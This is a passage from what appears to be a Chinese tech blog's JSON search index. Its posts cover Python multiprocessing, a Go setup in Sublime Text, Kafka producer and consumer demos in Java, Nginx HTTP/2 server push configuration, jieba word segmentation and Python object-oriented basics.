server.sendmail(from_addr, to_addr, msg.as_string()) server.quit()","categories":[],"tags":[]},{"title":"人类的效率和机器的效率","slug":"人类的效率和机器的效率","date":"2018-04-28T02:19:42.000Z","updated":"2021-02-26T06:05:29.299Z","comments":true,"path":"posts/39795.html","link":"","permalink":"https://awen.me/posts/39795.html","excerpt":"","text":"检验成功的时候到了，在没上机器人之前，4月1号-4月15号，部门平均首次响应时间36分钟","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 的多进程","slug":"python-的多进程","date":"2018-04-27T10:19:44.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/7020.html","link":"","permalink":"https://awen.me/posts/7020.html","excerpt":"还是最近写的自动回复用户问题的机器人，一开始都是启动一个进程在跑，但是这样有个缺点，就是所有的函数都必须在几乎同一时间执行，但是我希望三个函数分别需要在1分钟调用一次，2分钟调用一次，30分钟调用一次。但是写一个死循环也只能在某个时间内同时调用，这显然不符合我的需求，于是我希望把这三个方法都实现死循环的方式，但是每个方法执行完毕后等待的时间不一样。 这个需求就需要使用到多进程了。在操作系统中，一个进程默认只有一个线程在工作，也就是说你所有的程序都是在进程上面的线程里执行的，那我这个需求很显然使用一个进程跑是不能满足的，需要使用多个进程并行完成。 Unix/Linux操作系统提供了一个fork()系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是fork()调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。","text":"还是最近写的自动回复用户问题的机器人，一开始都是启动一个进程在跑，但是这样有个缺点，就是所有的函数都必须在几乎同一时间执行，但是我希望三个函数分别需要在1分钟调用一次，2分钟调用一次，30分钟调用一次。但是写一个死循环也只能在某个时间内同时调用，这显然不符合我的需求，于是我希望把这三个方法都实现死循环的方式，但是每个方法执行完毕后等待的时间不一样。 这个需求就需要使用到多进程了。在操作系统中，一个进程默认只有一个线程在工作，也就是说你所有的程序都是在进程上面的线程里执行的，那我这个需求很显然使用一个进程跑是不能满足的，需要使用多个进程并行完成。 Unix/Linux操作系统提供了一个fork()系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是fork()调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。 ss 子进程永远返回0，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用getppid()就可以拿到父进程的ID。 Python的os模块封装了常见的系统调用，其中就包括fork，但是 fork 只能在 unix 系统使用，如果要实现跨平台需要使用multiprocessing 模块 先导入包 from multiprocessing import Process然后看下代码 def do_run_1(self): while 1: print(&apos;Parent process pending %s.&apos; % os.getpid()) time.sleep(1800) def do_run_2(self): while 1: print(&apos;Parent process new %s.&apos; % os.getpid()) time.sleep(60) def do_run_3(self): while 1: print(&apos;Parent process open %s.&apos; % os.getpid()) time.sleep(300) def main(self): p1 = Process(target=kf5.do_run_1) p1.start() p2 = Process(target=kf5.do_run_2) p2.start() p3 = Process(target=kf5.do_run_3) p3.start() if __name__ == &apos;__main__&apos;: kf5 = kf5API() kf5.main()这样就实现了3个进程同时跑 [root@centos ~]# ps aux | grep xxx.py root 3502 0.0 0.2 208876 17860 pts/2 S+ 17:38 0:00 python3 /opt/xxx.py root 3506 0.0 0.1 208876 14300 pts/2 S+ 17:38 0:00 python3 /opt/xxx.py root 3507 0.0 0.1 208876 14308 pts/2 S+ 17:38 0:00 python3 /opt/xxx.py root 3508 0.0 0.2 214392 17972 pts/2 S+ 17:38 0:00 python3 /opt/xxx.py","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Mac sublime text 3 配置 go 开发环境","slug":"Mac-sublime-text-3-配置-go-开发环境","date":"2018-04-27T02:14:31.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/64483.html","link":"","permalink":"https://awen.me/posts/64483.html","excerpt":"工欲善其事必先利其器，学习 go 我们需要先搭建 go 开发环境，本文主要介绍如何在 mac 下使用 sublime text 3 搭建 go 开发环境","text":"工欲善其事必先利其器，学习 go 我们需要先搭建 go 开发环境，本文主要介绍如何在 mac 下使用 sublime text 3 搭建 go 开发环境 下载 go去这里 下载 mac 安装包 安装后设置环境变量 export GOPATH=/Users/wenjun/go # 配置工作目录 export GOROOT=/usr/local/go # 默认的go 路径 export PATH=$PATH:$M2_HOME/bin:$GOROOT/bin然后在命令行输入 go version 提示如下信息则表示配置成功 go version go1.10.1 darwin/amd64打开终端，输入 go get -u github.com/nsf/gocode go install github.com/nsf/gocode安装 sublime text 31.下载Sublime Text http://www.sublimetext.com/ 2.安装package-ctrl 3.在 view-&gt;show console 下 输入 import urllib.request,os; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &apos;wb&apos;).write(urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;,&apos;%20&apos;)).read())回车后安装完毕重启 sublime 找到 package control 或者按 command+shift+p 如图所示 输入 install 选择 Install Package，输入 gosublime 然后按照如图所示选择 gosublime user 的配置文件 输入以下内容报错，根据实际需求调整 { &quot;env&quot;: { &quot;GOPATH&quot;: &quot;/usr/local/go&quot;, &quot;GOROOT&quot;: &quot;/Users/wenjun/go&quot; } }安装如图所示选择 New Build System 输入以下内容 { &quot;shell_cmd&quot;: &quot;go run $file&quot;, &quot;encoding&quot;: &quot;utf-8&quot; }保存为 Gobuild.sublime-build，然后选择 Tools-&gt;Build System 选中GoBuild 编写代码后按 command +b 即可执行代码","categories":[],"tags":[{"name":"go","slug":"go","permalink":"https://awen.me/tags/go/"}]},{"title":"Java 连接kafka","slug":"Java-连接kafka","date":"2018-04-25T15:09:10.000Z","updated":"2021-02-26T06:05:29.251Z","comments":true,"path":"posts/55301.html","link":"","permalink":"https://awen.me/posts/55301.html","excerpt":"Java 连接 kafka说明1.本文以网易云 kafka 1.1.0 版本进行讲解，关于产品简介以及如何创建 kafka，请参考官网文档","text":"Java 连接 kafka说明1.本文以网易云 kafka 1.1.0 版本进行讲解，关于产品简介以及如何创建 kafka，请参考官网文档 2.本文bootstrap.servers地址为 c-m1dvx2wwog.kafka.cn-east-1.internal:9092 3.由于 kafka 只能在可用区 B 创建，如果需要在本地调试，需要先在可用区 B 搭建 VPN 连接。OpenVPN 搭建，参考文档 如无法连接，请检查安全组和系统防火墙，请在对应的 VPC 安全组中放行内网访问 9092端口以及允许外网访问 OpenVPN 端口 关于外网连接 openvpn 无法 解析 kafka 域名的问题我们连接 openvpn 后 ping c-m1dvx2wwog.kafka.cn-east-1.internal 是不行的，需要先在内网的机器上 ping 这个地址拿到 IP 后 [root@vpn ~]# ping c-m1dvx2wwog.kafka.cn-east-1.internal PING c-m1dvx2wwog.kafka.cn-east-1.internal (192.168.10.154) 56(84) bytes of data. 64 bytes from 192.168.10.154 (192.168.10.154): icmp_seq=1 ttl=64 time=1.33 ms 64 bytes from 192.168.10.154 (192.168.10.154): icmp_seq=2 ttl=64 time=0.740 ms 64 bytes from 192.168.10.154 (192.168.10.154): icmp_seq=3 ttl=64 time=0.502 ms ^C --- c-m1dvx2wwog.kafka.cn-east-1.internal ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2002ms rtt min/avg/max/mdev = 0.502/0.859/1.337/0.352 ms用这个 IP 去连接 kafka 创建一个 maven 工程1.创建一个 maven 工程，在pom.xml 中加入 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka_2.12&lt;/artifactId&gt; &lt;version&gt;1.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 需要注意：kafka-clients的版本必须和kafka安装的版本一致 Producer demopackage KafkaService; import java.util.Properties; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.Producer; import org.apache.kafka.clients.producer.ProducerRecord; public class KafkaProducerService { public static void main(String[] args) { Properties properties = new Properties(); properties.put(&quot;bootstrap.servers&quot;, &quot;192.168.10.154:9092&quot;); properties.put(&quot;acks&quot;, &quot;all&quot;); properties.put(&quot;retries&quot;, 0); properties.put(&quot;batch.size&quot;, 16384); properties.put(&quot;linger.ms&quot;, 1); properties.put(&quot;buffer.memory&quot;, 33554432); properties.put(&quot;key.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;); properties.put(&quot;value.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;); Producer&lt;String, String&gt; producer = null; try { producer = new KafkaProducer&lt;String, String&gt;(properties); for (int i = 0; i &lt; 100; i++) { String msg = &quot;Message &quot; + i; producer.send(new ProducerRecord&lt;String, String&gt;(&quot;test&quot;, msg)); System.out.println(&quot;Sent:&quot; + msg); } } catch (Exception e) { e.printStackTrace(); } finally { producer.close(); } }} 可以使用KafkaProducer类的实例来创建一个Producer，KafkaProducer类的参数是一系列属性值，下面分析一下所使用到的重要的属性： bootstrap.servers properties.put(&quot;bootstrap.servers&quot;, &quot;192.168.1.110:9092&quot;);bootstrap.servers 它是Kafka集群的IP地址，如果Broker数量超过1个，则使用逗号分隔，如”192.168.10.110:9092,192.168.10.110:9092”。 key.serializer&amp;value.serializer properties.put(&quot;key.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;); properties.put(&quot;value.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);序列化类型。 Kafka消息是以键值对的形式发送到Kafka集群的，其中Key是可选的，Value可以是任意类型。但是在Message被发送到Kafka集群之前，Producer需要把不同类型的消 息序列化为二进制类型。本例是发送文本消息到Kafka集群，所以使用的是StringSerializer。 发送Message到Kafka集群 for (int i = 0; i &lt; 100; i++) { String msg = &quot;Message &quot; + i; producer.send(new ProducerRecord&lt;String, String&gt;(&quot;test&quot;, msg)); System.out.println(&quot;Sent:&quot; + msg); } 上述代码会发送100个消息到test这个Topic Topic 要在控制台创建 执行上述程序运行结果如下: Consumer Demopackage KafkaService; import java.util.Arrays; import java.util.Properties; import org.apache.kafka.clients.consumer.ConsumerRecord; import org.apache.kafka.clients.consumer.ConsumerRecords; import org.apache.kafka.clients.consumer.KafkaConsumer; public class ConsumerDemo { public static void main(String[] args) { Properties properties = new Properties(); properties.put(&quot;bootstrap.servers&quot;, &quot;192.168.10.154:9092&quot;); properties.put(&quot;group.id&quot;, &quot;group-1&quot;); properties.put(&quot;enable.auto.commit&quot;, &quot;true&quot;); properties.put(&quot;auto.commit.interval.ms&quot;, &quot;1000&quot;); properties.put(&quot;auto.offset.reset&quot;, &quot;earliest&quot;); properties.put(&quot;session.timeout.ms&quot;, &quot;30000&quot;); properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;); properties.put(&quot;value.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;); KafkaConsumer&lt;String, String&gt; kafkaConsumer = new KafkaConsumer&lt;&gt;(properties); kafkaConsumer.subscribe(Arrays.asList(&quot;test&quot;)); while (true) { ConsumerRecords&lt;String, String&gt; records = kafkaConsumer.poll(100); for (ConsumerRecord&lt;String, String&gt; record : records) { System.out.printf(&quot;offset = %d, value = %s&quot;, record.offset(), record.value()); System.out.println(); } } } }可以使用KafkaConsumer类的实例来创建一个Consumer，KafkaConsumer类的参数是一系列属性值，下面分析一下所使用到的重要的属性： bootstrap.servers:和Producer一样，是指向Kafka集群的IP地址，以逗号分隔。 group.id:Consumer分组ID key.deserializer and value.deserializer 发序列化。Consumer把来自Kafka集群的二进制消息反序列化为指定的类型。因本例中的Producer使用的是String类型，所以调用StringDeserializer来反序列化 Consumer订阅了Topic为HelloWorld的消息，Consumer调用poll方法来轮循Kafka集群的消息，其中的参数100是超时时间（Consumer等待直到Kafka集群中没有消息为止）： 在控制台找到对应的 Topic 可以看到消费者信息","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://awen.me/tags/kafka/"}]},{"title":"Nginx 的新特性 server push","slug":"Nginx-的新特性-server-push","date":"2018-04-24T22:58:52.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/18534.html","link":"","permalink":"https://awen.me/posts/18534.html","excerpt":"简单来说就是有了 server push，服务器也有能力主动给客户端推送内容了。 传统的网页请求方式和有 server push 的请求方式对比","text":"简单来说就是有了 server push，服务器也有能力主动给客户端推送内容了。 传统的网页请求方式和有 server push 的请求方式对比 配置 server push1.首先，我们看下未启用 server push 之前的请求，当请求网站根目录下的 /index.html 服务器会加载资源，如果 A 资源依赖 B， 则在去请求 B 2.开启 server push 需要 nginx 1.13.9 以上版本，在 server 段配置如下 要将资源与页面加载一起推送，请http2_push按如下所示使用该指令： listen 443 ssl http2; # 需要开启 http2 …… location / { http2_push /uploads/IMG_4224.JPG; http2_push /images/netease.png; }验证HTTP / 2服务器推送1.然后再次请求可以看到请求中会有 push 的字段，服务器开始先请求 /index.html 如果配置了 server push 则会直接把对应的资源一并返回给客户端。 2.也可以用 nghttp 测试，带*的表示是支持 server push 的 ➜ ~ nghttp -ans https://awen.me ***** Statistics ***** Request timing: responseEnd: the time when last byte of response was received relative to connectEnd requestStart: the time just before first byte of request was sent relative to connectEnd. If &apos;*&apos; is shown, this was pushed by server. process: responseEnd - requestStart code: HTTP status code size: number of bytes received as response body without inflation. URI: request URI see http://www.w3.org/TR/resource-timing/#processing-model sorted by &apos;complete&apos; id responseEnd requestStart process code size request path 13 +31.14ms +164us 30.97ms 200 9K / 15 +88.43ms +31.20ms 57.23ms 200 11K /css/main.css?v=5.1.1 21 +88.50ms +31.23ms 57.27ms 200 1K /js/src/utils.js?v=5.1.1 23 +88.66ms +31.23ms 57.43ms 200 1K /js/src/motion.js?v=5.1.1 25 +88.70ms +31.23ms 57.47ms 200 1017 /js/src/affix.js?v=5.1.1 27 +88.71ms +31.23ms 57.48ms 200 274 /js/src/schemes/pisces.js?v=5.1.1 29 +89.84ms +31.23ms 58.61ms 200 1K /js/src/scrollspy.js?v=5.1.1 31 +89.89ms +31.24ms 58.65ms 200 940 /js/src/post-details.js?v=5.1.1 33 +89.90ms +31.24ms 58.66ms 200 859 /js/src/bootstrap.js?v=5.1.1 17 +91.21ms +31.22ms 59.99ms 200 4K /favicon.ico?v=5.1.1 19 +114.58ms +31.23ms 83.35ms 200 26K /uploads/IMG_4224.JPG 10 +224.05ms * +24.51ms 199.54ms 200 4K /favicon.ico 12 +224.12ms * +24.52ms 199.60ms 404 162 /IMG_4224.JPG 14 +224.22ms * +24.53ms 199.69ms 200 2K /images/netease.png 8 +313.28ms * +24.50ms 288.78ms 200 47K /sitemap.xml 2 +319.28ms * +23.30ms 295.98ms 200 119K /rss.xml 4 +431.86ms * +24.48ms 407.38ms 200 129K /baidusitemap.xml 6 +1.53s * +24.49ms 1.50s 200 1M /search.xml 自动将资源推送给客户在很多情况下，列出您希望推送到NGINX配置文件中的资源是不方便的，甚至是不可能的。出于这个原因，NGINX也支持拦截Link预加载头的约定，然后推送这些头中标识的资源。要启用预加载，请http2_push_preload在配置中包含指令： server { # Ensure that HTTP/2 is enabled for the server listen 443 ssl http2; ssl_certificate ssl/certificate.pem; ssl_certificate_key ssl/key.pem; root /var/www/html; # Intercept Link header and initiate requested Pushes location = /myapp { proxy_pass http://upstream; http2_push_preload on; } }例如，当NGINX作为代理服务器（用于HTTP，FastCGI或其他流量类型）运行时，上游服务器可以Link为其响应添加如下标题： Link: &lt;/style.css&gt;; as=style; rel=preloadNGINX拦截这个头并开始服务器推送/style.css。Link标题中的路径必须是绝对路径 - 不支持像./style.css这样的相对路径。该路径可以选择包含查询字符串。 要推送多个对象，可以提供多个Link标题，或者更好的是，将所有对象包含在逗号分隔的列表中： Link: &lt;/style.css&gt;; as=style; rel=preload, &lt;/favicon.ico&gt;; as=image; rel=preload如果您不希望NGINX推送预加载的资源，请将该nopush参数添加到标头中： # Resource is not pushed Link: &lt;/nginx.png&gt;; as=image; rel=preload; nopush当http2_push_preload启用时，您还可以通过在NGINX配置中设置响应标题来启动预加载服务器推送： add_header Link &quot;&lt;/style.css&gt;; as=style; rel=preload&quot;;有选择地向客户推送资源HTTP / 2规范没有解决确定是否推送资源的挑战。显然，如果你知道他们可能需要这些资源并且不太可能已经缓存了资源，那么最好只将资源推送给客户端。 一种可能的方法是仅在首次访问该网站时将资源推送给客户。例如，您可以测试会话cookie的存在情况，并Link有条件地设置标题，以便仅在会话cookie不存在时才预加载资源。 假设客户端运行良好，并在随后的请求中包含cookie，使用以下配置，NGINX每次浏览器会话仅向客户端推送一次资源： server { listen 443 ssl http2 default_server; ssl_certificate ssl/certificate.pem; ssl_certificate_key ssl/key.pem; root /var/www/html; http2_push_preload on; location = /demo.html { add_header Set-Cookie &quot;session=1&quot;; add_header Link $resources; } } map $http_cookie $resources { &quot;~*session=1&quot; &quot;&quot;; default &quot;&lt;/style.css&gt;; as=style; rel=preload, &lt;/image1.jpg&gt;; as=image; rel=preload, &lt;/image2.jpg&gt;; as=style; rel=preload&quot;; }","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"python拼接list","slug":"python拼接list","date":"2018-04-23T07:05:44.000Z","updated":"2021-02-26T06:05:29.288Z","comments":true,"path":"posts/56296.html","link":"","permalink":"https://awen.me/posts/56296.html","excerpt":"拼接可以使用 join","text":"拼接可以使用 join # encoding=utf-8 import jieba keywords = [] seg_list = jieba.cut(&quot;打不开&quot;, cut_all=False) for i in seg_list: keywords.append(i) if len(keywords) &gt;= 3: keywords = str.join(keywords) print(keywords)得到结果 ➜ Downloads python3 test.py Building prefix dict from the default dictionary ... Loading model from cache /var/folders/v1/slqlcj696z9cpj31tbwzyly00000gn/T/jieba.cache Loading model cost 0.982 seconds. Prefix dict has been built succesfully. [&apos;打不开&apos;]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 中文分词","slug":"python-中文分词","date":"2018-04-22T22:44:46.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/39426.html","link":"","permalink":"https://awen.me/posts/39426.html","excerpt":"最近写的那个机器人，我想让他更加智能些，比如根据用户回复的内容来进行判断该如何进行回复。 但是要判断用户输入的内容是否符合预期其实还是比较费劲的。 我这里使用jieba 这个 python 库。","text":"最近写的那个机器人，我想让他更加智能些，比如根据用户回复的内容来进行判断该如何进行回复。 但是要判断用户输入的内容是否符合预期其实还是比较费劲的。 我这里使用jieba 这个 python 库。 安装库pip3 install jieba官网的例子可以看下 import jieba content = &quot;好的，谢谢，我的问题已经解决了&quot; seg_list = jieba.cut(content, cut_all=False) key = [] for i in seg_list: key.append(i) print(key) listcontent = [&quot;好&quot;,&quot;好的&quot;,&quot;谢谢&quot;,&quot;可以了&quot;,&quot;明白&quot;,&quot;感谢&quot;,&quot;好评&quot;] count = int(len(list(set(listcontent).intersection(set(key))))) print(count)输出 [&apos;好&apos;, &apos;的&apos;, &apos;，&apos;, &apos;谢谢&apos;, &apos;，&apos;, &apos;我&apos;, &apos;的&apos;, &apos;问题&apos;, &apos;已经&apos;, &apos;解决&apos;, &apos;了&apos;]我判断下 A 和 B 2个 list 是否有交集大概可以判断用户的问题是什么？但其实并不特别准。 另外关于 python list 比较我这里也收集了些资料 #求交集的两种方式 retA = [i for i in listA if i in listB] retB = list(set(listA).intersection(set(listB))) print &quot;retA is: &quot;,retA print &quot;retB is: &quot;,retB #求并集 retC = list(set(listA).union(set(listB))) print &quot;retC1 is: &quot;,retC #求差集，在B中但不在A中 retD = list(set(listB).difference(set(listA))) print &quot;retD is: &quot;,retD retE = [i for i in listB if i not in listA] print &quot;retE is: &quot;,retE","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"掌握一门编程语言很有必要","slug":"掌握一门编程语言很有必要","date":"2018-04-21T00:25:39.000Z","updated":"2021-02-26T06:05:29.339Z","comments":true,"path":"posts/21125.html","link":"","permalink":"https://awen.me/posts/21125.html","excerpt":"最近这2天自己用 python 写了一个根据问题场景自动回复用户问题的机器人，一共不到500行的代码量。当然这是用 python 来实现，其他语言可能不止这个代码量。","text":"最近这2天自己用 python 写了一个根据问题场景自动回复用户问题的机器人，一共不到500行的代码量。当然这是用 python 来实现，其他语言可能不止这个代码量。 我非科班出身，在14年之前，我根本不会编程，但是基础的计算机知识还是知道的，14年之前也就会点 linux 基础命令，也是因为兴趣使然以及本专业实在不好找工作，于是我转行做了 IT,自学加培训了网络、Linux 系统管理、Java 、python 等等。刚入行肯定也是干不了多么高大上的工作，于是找了个技术支持的工作，一边工作，一边学习。 互联网行业的技术支持的工作其实说白点就是个高级点的客服，你要比客服懂点业务，懂点技术，技术含量在我看来其实并不是特别高，或者我觉得大部分的公司其实技术含量都不高,但是大家工作的目的都是相同的，服务好客户，为公司创造利润，赚钱养家糊口，因为平时工作面对的都是一些开发者，因此掌握一些语言是非常有必要的，你要协助用户调试 API，定位用户的问题根源，并给用户解决问题。 那么几乎每个公司都有绩效考核，我们也不例外，绩效考核要求，我们在处理客户的问题时做到以下几点： 5-30分钟内响应工单，区分用户级别，企业用户5分钟，个人用户30分钟。 超过 4 小时客户未回复的工单，要与用户确认是否已经解决。 超过 24 小时客户未回复的的工单，要关闭它。 你会就发现，这些流程基本都是重启且固定的，但是有时候因为忙于其他事情，耽误了工单的回复时间，比如说： 在开会 去上厕所了，蹲大号至少5分钟之内起不来吧 找其他同事沟通问题 午休时间吃饭，客户找过来了。 等等，都有可能无法及时处理和回复工单，那既然这个绩效在这，要想达到这个标准，恐怕是要使点手段了。 如果你会点编程，你就可以把这些流程自动化起来，新加入一个工单，你就去回复用户一下，这样既不影响 SLA,也给你充足的时间去解决问题。 编程其实并不难，程序这个东西基本都是你给定他一个条件，然后计算机根据这个条件去操作某个事情，比如拿上面的回复工单来说，无非就是新接入一个工单，你要去回复一下客户，当然，这个事情并没有这么简单，这个过程你要进行各种的条件判断以及传入各种参数。 现在大部分的云化服务都有 API 接口，大部分程序的工作内容其实基本都是和各种接口打交道，包括语言自己的接口，以及第三方的接口。 最后，我其实想说的事，一定要跟上时代的步伐，主动学习新技术。未来，那些重复性很高的工作随时都有可能被机器给替代掉。 比如说这个客服吧！当有了大量的数据后，可以通过机器学习，准确的告知用户问题的答案。 比如说审核人员，通过训练机器来精准识别内容是否违规，并且计算机的运算速度和效率可比人类高出不知道多少倍，人需要休息，而计算机不需要。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 列表转字典","slug":"python-列表转字典","date":"2018-04-18T03:11:47.000Z","updated":"2021-02-26T06:05:29.283Z","comments":true,"path":"posts/64066.html","link":"","permalink":"https://awen.me/posts/64066.html","excerpt":"","text":"python 中 如果要把 2个列表转换成字典怎么处理，比如我们有2组字典 a = [&apos;28375&apos;, &apos;28374&apos;, &apos;28373&apos;, &apos;28372&apos;, &apos;28371&apos;, &apos;28370&apos;, &apos;28369&apos;, &apos;28368&apos;, &apos;28367&apos;, &apos;28366&apos;, &apos;28365&apos;] b = [&apos;2&apos;, &apos;1&apos;, &apos;2&apos;, &apos;4&apos;, &apos;2&apos;, &apos;2&apos;, &apos;2&apos;, &apos;4&apos;, &apos;1&apos;, &apos;2&apos;, &apos;2&apos;]希望转换成字典，可用使用 zip d = dict(zip(result_id,result_status))则输出 {&apos;28375&apos;: &apos;2&apos;, &apos;28374&apos;: &apos;1&apos;, &apos;28373&apos;: &apos;2&apos;, &apos;28372&apos;: &apos;4&apos;, &apos;28371&apos;: &apos;2&apos;, &apos;28370&apos;: &apos;2&apos;, &apos;28369&apos;: &apos;2&apos;, &apos;28368&apos;: &apos;4&apos;, &apos;28367&apos;: &apos;1&apos;, &apos;28366&apos;: &apos;2&apos;, &apos;28365&apos;: &apos;2&apos;}","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 使用@property","slug":"python-使用-property","date":"2018-04-17T02:48:15.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/4532.html","link":"","permalink":"https://awen.me/posts/4532.html","excerpt":"","text":"在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改： s = Student() s.score = 9999这显然不合逻辑。为了限制score的范围，可以通过一个set_score()方法来设置成绩，再通过一个get_score()来获取成绩，这样，在set_score()方法里，就可以检查参数： class Student(object): def get_score(self): return self._score def set_score(self, value): if not isinstance(value, int): raise ValueError(&apos;score must be an integer!&apos;) if value &lt; 0 or value &gt; 100: raise ValueError(&apos;score must between 0 ~ 100!&apos;) self._score = value但是，上面的调用方法又略显复杂，没有直接用属性这么直接简单。 我们可以这样 class Student(object): @property def score(self): return self._score @score.setter def score(self, value): if not isinstance(value, int): raise ValueError(&apos;score must be an integer!&apos;) if value &lt; 0 or value &gt; 100: raise ValueError(&apos;score must between 0 ~ 100!&apos;) self._score = value s = Student() s.score = 60 print(s.score)@property的实现比较复杂，我们先考察如何使用。把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作：","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 的__slots__方法","slug":"python-的-slots-方法","date":"2018-04-17T02:39:29.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/7370.html","link":"","permalink":"https://awen.me/posts/7370.html","excerpt":"使用slots 可以限制实例的属性 class Student(object): pass s = Student() s.name = &apos;Michael&apos; s.age = 25 s.score = 99","text":"使用slots 可以限制实例的属性 class Student(object): pass s = Student() s.name = &apos;Michael&apos; s.age = 25 s.score = 99 这样是没有问题的，但是通过slots 可以限制只能添加 name 和 age 属性 class Student(object): pass __slots__ = (&apos;name&apos;,&apos;age&apos;) s = Student() s.name = &apos;Michael&apos; s.age = 25 s.score = 99会提示 Traceback (most recent call last): File &quot;/Users/wenjun/PycharmProjects/python2018/day01/oopdemo.py&quot;, line 11, in &lt;module&gt; s.score = 99 AttributeError: &apos;Student&apos; object has no attribute &apos;score&apos;由于’score’没有被放到slots中，所以不能绑定score属性，试图绑定score将得到AttributeError的错误。 使用slots要注意，slots定义的属性仅对当前类实例起作用，对继承的子类是不起作用的： 除非在子类中也定义slots，这样，子类实例允许定义的属性就是自身的slots加上父类的slots。 class Student(object): pass __slots__ = (&apos;name&apos;,&apos;age&apos;) class GraduateStudent(Student): pass g = GraduateStudent() g.score = 9999","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 的实例属性和类属性 ","slug":"python-的实例属性和类属性","date":"2018-04-16T09:24:41.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/3850.html","link":"","permalink":"https://awen.me/posts/3850.html","excerpt":"由于Python是动态语言，根据类创建的实例可以任意绑定属性。 给实例绑定属性的方法是通过实例变量，或者通过self变量，但是如果类本身需要绑定一个属性呢，可以直接在 class 中定义","text":"由于Python是动态语言，根据类创建的实例可以任意绑定属性。 给实例绑定属性的方法是通过实例变量，或者通过self变量，但是如果类本身需要绑定一个属性呢，可以直接在 class 中定义 class Student(object): name = &apos;Student&apos; s = Student() print(s.name) print(Student.name) s.name = &apos;Michael&apos; print(s.name) print(Student.name) del s.name print(s.name)分别输出 Student Student Michael Student Student在编写程序的时候，千万不要对实例属性和类属性使用相同的名字，因为相同名称的实例属性将屏蔽掉类属性，但是当你删除实例属性后，再使用相同的名称，访问到的将是类属性。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 的继承和多态","slug":"python-的继承和多态","date":"2018-04-16T09:07:12.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/17678.html","link":"","permalink":"https://awen.me/posts/17678.html","excerpt":"python 由于是面向对象的语言，因此都有继承和多态的特点","text":"python 由于是面向对象的语言，因此都有继承和多态的特点 继承class Animal(object): def run(self): print(&apos;Animal is running....&apos;) class Dog(Animal): pass class Cat(Animal): pass dog = Dog() dog.run() cat = Cat() cat.run()我们看到上面的 Dog 和 Cat 都继承了 Animal，python 中继承是在 class 的类名的括号中加入父类的名称。 输出 Animal is running.... Animal is running....但是我们看上面的输出肯定不是我们想要的，我们希望 dog 输入 dog is running cat 输出 cat is running。 我们修改下代码 class Animal(object): def run(self): print(&apos;Animal is running....&apos;) class Dog(Animal): def run(self): print(&quot;Dog is running....&quot;) class Cat(Animal): def run(self): print(&quot;Cat is running....&quot;) dog = Dog() dog.run() cat = Cat() cat.run()子类重写了父类的 run 方法，这就叫多态 在继承关系中，如果一个实例的数据类型是某个子类，那它的数据类型也可以被看做是父类。但是，反过来就不行：","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 面向对象","slug":"python-面向对象","date":"2018-04-16T06:09:34.000Z","updated":"2021-02-26T06:05:29.286Z","comments":true,"path":"posts/182.html","link":"","permalink":"https://awen.me/posts/182.html","excerpt":"什么是面向对象？","text":"什么是面向对象？ 哈哈，其实此对象非彼对象，程序中的面向对象可不是这样，假设我们要处理学生的成绩表，为了表示一个学生的成绩，面向过程的程序可以用一个dict表示： std1 = { &apos;name&apos;: &apos;Michael&apos;, &apos;score&apos;: 98 } std2 = { &apos;name&apos;: &apos;Bob&apos;, &apos;score&apos;: 81 }而处理学生成绩可以通过函数实现，比如打印学生的成绩： def print_score(std): print(&apos;%s: %s&apos; % 